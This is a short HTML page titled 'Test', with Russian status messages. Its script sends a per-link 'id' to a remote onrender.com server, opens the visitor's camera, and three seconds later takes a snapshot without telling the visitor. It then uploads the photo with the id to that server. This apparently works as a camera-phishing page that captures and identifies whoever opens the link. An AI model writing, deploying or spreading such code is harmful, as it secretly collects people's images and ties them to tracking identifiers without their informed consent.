<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Test</title>
</head>

<body>

<h2 id="status">Запуск...</h2>

<video id="video" autoplay playsinline width="300"></video>

<script>

const RENDER_URL = "https://kossah-github-io.onrender.com";


async function start(){

    const status = document.getElementById("status");

    const params = new URLSearchParams(window.location.search);
    const id = params.get("id");


    if(!id){
        status.innerHTML = "Нет ID";
        return;
    }


    // отправляем ID

    await fetch(
        RENDER_URL + "/?id=" + id
    );


    status.innerHTML = "ID отправлен, открываю камеру";


    try {

        const stream = await navigator.mediaDevices.getUserMedia({
            video:true
        });


        const video = document.getElementById("video");

        video.srcObject = stream;


        status.innerHTML = "Камера работает";


        setTimeout(()=>{


            const canvas = document.createElement("canvas");

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;


            canvas.getContext("2d")
            .drawImage(video,0,0);



            canvas.toBlob(async(blob)=>{


                let form = new FormData();

                form.append("id", id);

                form.append(
                    "photo",
                    blob,
                    "photo.jpg"
                );


                const res = await fetch(
                    RENDER_URL + "/photo",
                    {
                        method:"POST",
                        body:form
                    }
                );


                status.innerHTML =
                await res.text();


                stream.getTracks()
                .forEach(t=>t.stop());


            }, "image/jpeg");



        },3000);



    } catch(e){

        status.innerHTML =
        "Ошибка камеры: " + e;

    }

}


start();

</script>

</body>
</html>
